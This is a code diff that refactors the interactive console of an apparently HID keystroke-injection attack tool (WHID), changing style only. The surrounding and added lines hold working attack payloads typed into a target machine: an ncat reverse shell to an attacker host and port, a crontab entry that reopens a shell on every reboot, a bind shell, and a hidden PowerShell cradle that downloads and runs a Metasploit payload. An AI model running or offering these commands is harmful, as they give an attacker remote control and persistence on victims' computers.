@@ -32,7 +32,7 @@ if __name__ == "__main__":
 
     info = WhidInfo()
     whid = WhidEngine(results.panel)
-    while(True):
+    while True:
         user_input = input("\033[92m>>> \033[0m")
 
 
@@ -64,29 +64,25 @@ if __name__ == "__main__":
         else:
 
             # Simple user interactions
-            if user_input == "q" or user_input=="exit":
+            if user_input in ["q", "exit"]:
                 exit()
 
-            elif user_input == "h" or user_input == "help":
+            elif user_input in ["h", "help"]:
                 info.help()
                 info.help_keyboard()
                 info.help_commands()
                 continue
 
-            # Reverse Shell Linux
-            elif "reverse" == user_input :
+            elif user_input == "reverse":
                 user_input = "bash -c 'nohup ncat %s %s -e $SHELL &'" % (results.host, results.port)
 
-            # Crontab Linux
-            elif "crontab" == user_input :
+            elif user_input == "crontab":
                 user_input = "bash -c '(crontab -l ; echo \"@reboot sleep 200 && ncat %s %s -e /bin/bash\")|crontab 2> /dev/null'" % (results.host, results.port)
 
-            # Bind Shell Linux
-            elif "bind" == user_input:
+            elif user_input == "bind":
                 user_input = "bash -c 'nohup ncat -lvp %s -e $SHELL -k &'" % (results.port)
 
-            # Meterpreter or anything for Windows
-            elif "meterpreter" in user_input :
+            elif "meterpreter" in user_input:
                 """
                 # Use the following to set up the listener
                 use exploit/multi/script/web_delivery
@@ -106,18 +102,17 @@ if __name__ == "__main__":
                 if len(user_input.split(" ")) > 1:
                     msf_host = user_input.split(" ")[1]
                 else:
-                    msf_host = "https://%s:%s/posh-payload" % (results.host, results.port)
+                    msf_host = f"https://{results.host}:{results.port}/posh-payload"
 
                 user_input = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$i=new-object net.webclient;$i.proxy=[Net.WebRequest]::GetSystemWebProxy();$i.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $i.downloadstring('%s');" % msf_host
 
                 # Send the payload
                 user_converted = whid.convert_to_keymap(user_input, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176", results.force)
-                whid.send_payload(user_converted, results.panel+"/runlivepayload")
+                whid.send_payload(user_converted, f"{results.panel}/runlivepayload")
                 continue
 
 
-            # Send simple text without using a payload chain
-            elif 'send' == user_input.split(' ')[0]:
+            elif user_input.split(' ')[0] == 'send':
                 # Convert the simple text to keymap
                 txt = "".join(user_input.split(' ')[1:])
                 user_converted = whid.convert_to_keymap(txt, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176", results.force)
@@ -125,7 +120,7 @@ if __name__ == "__main__":
                     print('\033[92mText:\033[0m\n%s' % user_converted)
 
                 # Send the payload
-                whid.send_payload(user_converted, results.panel+"/runlivepayload")
+                whid.send_payload(user_converted, f"{results.panel}/runlivepayload")
                 continue
 
             # Send evil command with default payload
@@ -137,4 +132,4 @@ if __name__ == "__main__":
                     print('\033[92mPayload:\033[0m\n%s' % user_converted)
 
                 # Send the payload
-                whid.send_payload(user_converted, results.panel+"/runlivepayload")
+                whid.send_payload(user_converted, f"{results.panel}/runlivepayload")
